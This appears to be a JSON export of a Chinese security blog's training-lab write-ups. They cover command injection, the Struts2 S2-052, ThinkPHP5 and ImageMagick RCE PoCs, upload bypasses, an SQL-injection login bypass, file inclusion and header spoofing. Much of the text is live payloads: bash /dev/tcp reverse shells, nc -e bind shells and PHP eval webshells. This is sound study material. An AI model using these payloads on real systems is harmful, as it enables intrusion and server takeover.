注意点：一句话木马是用的POST不是GET","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"}]},{"title":"合天培训_实验_命令执行","slug":"合天培训_实验_命令执行","date":"2020-05-01T08:53:17.000Z","updated":"2020-05-01T13:50:23.064Z","comments":true,"path":"web/合天培训_实验_命令执行/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的PHP代码执行函数分析。（3）能执行系统命令的系统命令执行函数分析","text":"本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的PHP代码执行函数分析。（3）能执行系统命令的系统命令执行函数分析 1. 命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401 实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。 2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。 尝试127.0.0.1 3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。 4）构造payload 127.0.0.1 | net user 查看用户 127.0.0.1 | echo ““ &gt; 1.php 写php文件 127.0.0.1 | echo ““ &gt; shell.php 写shell 用菜刀连接 由于实验机里没有nc工具就不尝试反弹shell了。 5)medium难度操作 通过fuzz发现&amp;&amp;和;被过滤了。 127.0.0.1;dir 127.0.0.1 &amp;&amp; dir 但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的| 如果非要用&amp;&amp;可以使用下面方式： 1127.0.0.1 &amp;;&amp; dir 所以medium存在问题是使用黑名单，且黑名单机制不全。 2. CVE-2017-9805Struts2-052漏洞实验（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2 实验来源：合天网安实验室 实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术 （2）实验操作 1）搭建实验环境。 tomcat开启。下载软件源代码，部署war文件。打开 http://127.0.0.1:8080/struts2-rest-showcase 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。 2）正常业务 点击edit，随便输入内容提交，成功提交。 3）poc测试 发现报错500，rce成功。而且弹出了计算器。 4）漏洞分析 XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。 5）poc分析 poc: 123456&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; &lt;dataHandler&gt; &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; &lt;is class=\"javax.crypto.CipherInputStream\"&gt; &lt;cipher class=\"javax.crypto.NullCipher\"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; &lt;next class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;cacl&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=\"string\"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;&lt;/entry&gt;&lt;/map&gt; poc看不懂，分析是传入xml文件，估计下面语句 1&lt;command&gt;&lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt;&lt;/command&gt; 被当作命令执行。 3. Thinkphp5 远程命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 （2）实验操作 1）安装环境。 利用netstat -tunlp检测是否开启AMP。注意php端口为9000。 下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。 2）实验操作 直接利用实验里带的ThinkPHP5漏洞检测工具。 发现poc。 1index.php?s=/index/\\think\\request\\cache&amp;key=1|phpinfo 测试 发现正确。然后getshell. 3）漏洞分析 a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]，所以可以通过控制输入的参数s来控制pathinfo. b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。 c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。 问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。 e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。 4）poc poc不懂。。。 4. ImageMagick漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法 （2）实验操作 1）检查ImageMagick版本 版本号为6.8.9. 2）漏洞测试 创建exploit.png,其内容为： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|ls \"-la)'pop graphic-context 利用convert生成新文件： 1convert exploit.png out.png 可以发现成功执行了ls -a命令。证明存在命令执行漏洞。 3）漏洞利用 在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。 发现是用的ImageMagick工具转换的。 先下载 nc，并在本地开启监听。 1nc.exe -nvlp 12301 上传一个可以弹shell的图片。图片内容： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1\")'pop graphic-context 上传后shell反弹成功。 4）漏洞分析 ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为： 1\"wget\" -q -O \"%o\" \"https:%M\" 而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。 5.web安全之命令执行漏洞理解A.rce_ping（1）正常业务 1127.0.0.1 有回显。 （2）fuzz测试。 首先抓包 发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如 123exec($_POST['submit'].\" \".$_POST['ipaddress'],$return);echo $return;echo system($_POST['submit'].\" \".$_POST['ipaddress']);echo shell_exec($_POST['submit'].\" \".$_POST['ipaddress']); 为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。 （3）由于没有任何过滤所以直接写shell。 1ipaddress=127.0.0.1 | echo \"&lt;?php @eval($_POST['cmd']); ?&gt;\" &gt; shell.php &amp; submit=ping 尝试连接： 发现失败，估计没有写的权限。 （4）尝试shell a.正向shell 服务器 1ipaddress=127.0.0.1 | nc -lvp 7777 -e /bin/bash 本机 1nc 47.105.75.177 7777 正向shell成功。 b.反弹shell 本机(自己的服务器)： 1nc -lk 7777 远程服务器 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxxx/7777 0&gt;&amp;1 发现反弹不成功。 换台服务器尝试 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxx/7777 0&gt;&amp;1 反弹shell成功。 B.rce_ping_2直接fuzz测试。 发现; &amp;&amp;被过滤了。 直接正向shell测试。 服务器 1ipaddress=127.0.0.1 | nc -lvp 7778 -e /bin/bash 本机 1nc 47.105.75.177 7778 c.rce_ping_3同样fuzz测试。 发现过滤了&amp; ;同第三关一样的测试即可。 D.rce_ping_4页面500 E.code规定三种能力。（1）列出目录（2）写shell (3)反弹shell a.array_filterarray_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) （1）列出目录 1func=system&amp;cmd=ls 成功列举目录 （2）写shell 1func=system&amp;echo \"&lt;?php $_POST[pass]&gt; ?&gt;\" &gt; shell.php 发现还是不能上传shell???这里想探究下。 当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。 (3)反弹shell。 1func=system&amp;cmd=nc -lvp 7781 -e /bin/bash 反弹成功。 b. array_maparray_map原型 1array_map ( callable $callback , array $array1 [, array $... ] ) 同样直接 1func=exec&amp;nc -lvp 7782 -e /bin/bash c.assertassert原型 1assert ( mixed $assertion [, string $description ] ) payload: 1shell_exec('nc -lvp 7783 -e /bin/bash') d.call_user_func函数原型 1call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 列举目录下文件： 1func=passthru&amp;cmd=ls payload: 1func=passthru&amp;cmd=nc -lvp 7784 -e /bin/bash e.create_funccreate_function ( string $args , string $code ) 同样payload: 1func=passthru&amp;cmd=nc -lvp 7785 -e /bin/bash 发现500了。。。。。。 f.evaleval ( string $code ) 直接shell。 1system('nc -lvp 31321 -e /bin/bash') 连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。 1system('nc -lvp 31321 -e /bin/bash'); 成功反弹shell。 g preg_replace1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 直接cmd=phpinfo(); 反弹shell。 1system('nc -lvp 31322 -e /bin/bash'); h preg_replace2可以在双引号中使用 1&#123;$&#123;代码&#125;&#125; 来执行代码 只能列出目录， 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system(ls)&#125;&#125;[/php] 正向shell出问题了。 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system('nc -lvp 31322 -e /bin/bash')&#125;&#125;[/php] F.sys由于题目较多，所以只进行简单的测试。 com 500错误 exec ls exec_l ls 发现会以数组的形式返回。 fyh ls passthru ls -a popen ls popen_l ls 没反应。此题不会。。。 shell_exec ls system ls G.ThinkPHP V5框架漏洞首先用dirsearch扫描， 发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22. 可以用云悉探测。 搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围： 1ThinkPHP 5.0系列 &lt;5.0.23，ThinkPHP 5.1系列&lt; 5.1.31，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。 所以直接利用 1index.php?s=/index/\\think\\request/cache&amp;key=1|phpinfo 发现不成功。 利用网上的Poc 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 利用成功 正确写shell姿势 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[\"code\"])?^&gt;&gt;shell.php 尝试正向shell。 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=nc -lvp 31328 -e /bin/bash 正向shell成功。","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"合天培训_实验_文件上传考核","slug":"合天培训_实验_文件上传考核","date":"2020-05-01T08:50:32.000Z","updated":"2020-05-01T15:47:04.613Z","comments":true,"path":"web/合天培训_实验_文件上传考核/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/","excerpt":"本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。","text":"本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。 1.beecms首先后台登录 绕过登录方法： 12用户名：admi' Un union ion Se%select%lect 1,'admin','9003d1df22eb4d3820015070385194c8',4,0 #密码：pwd 在后台发现上传图片功能： 1http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=add&amp;id=3&amp;nav=add_channel_product&amp;admin_p_nav=content&amp;lang=cn 实际检测，发现是MIME白名单检测，所以Burp改包即可。 然后在图片管理中可以看到上传的文件的路径： 1/vulnlab/sqli/beecms/upload/img/202004201359505400.php 2.fiyocms账户密码admin/admin888登录 找到上传文件的点： 1http://47.105.75.177/vulnlab/upload/fiyocms/dapur/?app=media&amp;type=files 但是上传按钮按不动。其他功能点也没有上传的，放弃。 老师讲了后发现themes下面有漏洞。 （1）任意文件读取 （2）任意文件上传 3.phpok账户密码admin/admin登录 找到修改头像的点，发现只能上传图像。 上传一个后缀名改为gif的php代码。 然后改包： 发现php被过滤了。 php fuzz测试。发现均被过滤了。 换思路，扫后台 扫出admin.php 登录发现不正确，应该用户表和管理员表是两张。 用户名：admin,密码： admin888 (利用其他网站的sql注入获得) 在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。 看burp包得到上传路径： 1res/202004/20/1555e119f9dc2b1f.php 访问资源即可： 1http://47.105.75.177/vulnlab/upload/phpok/res/202004/20/1555e119f9dc2b1f.php 为了方便其他同学做再改回去。 4.geez同样sql注入得到账户名密码：admin/admin445 发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。 然后在主页再检查头像的地址： 得到上传文件： 1./upload/1_dama1.php. 访问： 1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php. 发现不能解析。 改为大小写绕过得到上传文件： 1./upload/1_dama1.php 访问： 1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"合天培训_实验_文件包含漏洞","slug":"合天培训_实验_文件包含漏洞","date":"2020-05-01T04:51:26.000Z","updated":"2020-05-01T15:46:32.052Z","comments":true,"path":"web/合天培训_实验_文件包含漏洞/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","excerpt":"本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。","text":"本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。 本地文件包含（1）提示include.php，访问include.php （2）提示参数为file.利用file=include.php发现文件包含生效。 （3）尝试读取源代码 1file=php://filter/convert.base64-encode/resource=include.php base64解码后： 123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :) &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file); &#125; &#125;?&gt; 可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。 （4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。 上传一个一句话木马post.php。发现上传失败 因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png. 上传成功： 接下来进行文件包含。 http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png 利用菜刀连接即可。 远程文件包含（1）参数有file,提示php文件。代表只输入文件名就可以。 猜测代码： 12$file=$_GET['file'].\"php\";include($file); （2）读源码 file=php://filter/convert.base64-encode/resource=include 123456789101112131415161718&lt;html&gt;Tips: &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file.'.php'); &#125; &#125;?&gt; 题目要求phar，现在上传一个zip文件。 发现不能上传zip。抓包看下是基于什么机制过滤的。 发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg 然后利用phar协议访问zip中的post.php 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://upload/webshell.jpg/post.php 用菜刀连接尝试,发现连接失败。 看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径： 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://../1/upload/webshell.jpg/post.php 发现报错error。 再想一下，不仅忘记去掉后缀名php了，而且不支持.. 尝试使用绝对路径 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar:///var/www/html/vulnlab/include/1/upload/webshell.jpg/post 菜刀连接，成功连接","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"合天培训_实验_web安全之HTTP头部字段理解","slug":"合天培训_实验_web安全之HTTP头部字段理解","date":"2020-04-30T12:55:32.000Z","updated":"2020-05-01T15:47:22.127Z","comments":true,"path":"web/合天培训_实验_web安全之HTTP头部字段理解/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/","excerpt":"本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。","text":"本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。 第一题 观察HTTP 响应头题目提示观察http响应头所以只观察响应头即可。通过命令 1curl -v 47.105.75.177/vulnlab/head/1.php 得到: 1key: hello world! 第二题 Referer理解提示必须从www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段 通过命令 1curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php 从响应中获取key: 1key: you are right 第三题 X-Forwarded-For理解通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 http://www.hetianlab.com/ 。先curl下： 1curl 47.105.75.177/vulnlab/head/3.php 得到： 1this page only accept come from localhost 本地才能访问，所以伪造X-Forwarded-For为127.0.0.1 1curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php 得到key 1key: you are right 第四题 User-Agent理解题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令： 1curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php 得到key: 1key: you are right 第五题 Accept-Language理解 题目提示只允许外国人登录,猜测接收语言为英语即可。 1curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php 第六题 Cookie理解题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。 1curl -v 47.105.75.177/vulnlab/head/6.php 发现响应头中会设置cookie: 1Set-Cookie: Login=anonymous 所以请求时将cookie设置为Login=admin即可。 1curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}],"categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"},{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数组","slug":"数组","permalink":"http://blog.ydq6.com/tags/%E6%95%B0%E7%BB%84/"},{"name":"链表","slug":"链表","permalink":"http://blog.ydq6.com/tags/%E9%93%BE%E8%A1%A8/"},{"name":"hack_the_box","slug":"hack-the-box","permalink":"http://blog.ydq6.com/tags/hack-the-box/"},{"name":"sql注入","slug":"sql注入","permalink":"http://blog.ydq6.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"xxe","slug":"xxe","permalink":"http://blog.ydq6.com/tags/xxe/"},{"name":"靶机","slug":"靶机","permalink":"http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"js","slug":"js","permalink":"http://blog.ydq6.com/tags/js/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}